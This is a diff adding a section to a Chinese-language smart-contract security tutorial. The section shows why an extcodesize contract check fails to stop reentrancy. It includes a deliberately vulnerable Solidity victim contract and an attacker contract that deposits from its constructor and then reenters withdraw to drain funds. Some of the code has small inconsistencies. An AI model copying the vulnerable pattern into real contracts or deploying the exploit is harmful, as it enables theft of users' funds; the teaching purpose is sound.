@@ -99,7 +99,68 @@ contract Attacker {
 攻击者账户使用 1 个 ETH 调用 Attacker.beginAttack 函数重入攻击受害者账户，取走比它提供的更多的 ETH（从其他用户的余额中取走，导致受害者余额减少）。
 
 ### 如何处理重入攻击（错误的方法）
+一种简单的防止重入攻击的方法是通过阻止任何智能合约与你的代码进行交互。当你搜索 stackoverflow，你会发现这段代码有大量的赞：
+```
+function isContract(address addr) internal returns (bool) {
+  uint size;
+  assembly { size := extcodesize(addr) }
+  return size > 0;
+}
+```
 
+这似乎是有道理的：合约有代码，如果调用者有代码，就不允许存入。让我们添加它：
+```
+// THIS CONTRACT HAS INTENTIONAL VULNERABILITY, DO NOT COPY
+contract ContractCheckVictim {
+    mapping (address => uint256) public balances;
+
+    function isContract(address addr) internal returns (bool) {
+        uint size;
+        assembly { size := extcodesize(addr) }
+        return size > 0;
+    }
+
+    function deposit() external payable {
+        require(!isContract(msg.sender)); // <- NEW LINE
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() external {
+        uint256 amount = balances[msg.sender];
+        (bool success, ) = msg.sender.call.value(amount)("");
+        require(success);
+        balances[msg.sender] = 0;
+    }
+}
+```
+
+现在，为了存入ETH，你的地址必须没有智能合约代码。然而，这很容易被以下攻击者合约击败：
+```
+contract ContractCheckAttacker {
+    constructor() public payable {
+        ContractCheckVictim(VICTIM_ADDRESS).deposit(1 ether); // <- New line
+    }
+
+    function beginAttack() external payable {
+        ContractCheckVictim(VICTIM_ADDRESS).withdraw();
+    }
+
+    function() external payable {
+        if (gasleft() > 40000) {
+            Victim(VICTIM_ADDRESS).withdraw();
+        }
+   }
+}
+```
+
+第一次攻击是对合约逻辑的攻击，而这次是对以太坊合约部署行为的攻击。在部署过程中，合约尚未返回已在其地址部署完成上的代码，但在此过程中保留了完全的 EVM 控制。
+
+从技术上来说，防止智能合约调用你的代码是可能的，使用下面这行代码：
+```
+require(tx.origin == msg.sender)
+```
+
+然而，这仍然不是一个好的解决方案。以太坊最令人兴奋的一个方面是它的可组合性，智能合约相互集成和构建。通过使用上面的代码，您限制了项目的有用性。
 
 ### 如何处理重入攻击（正确的方法）
 
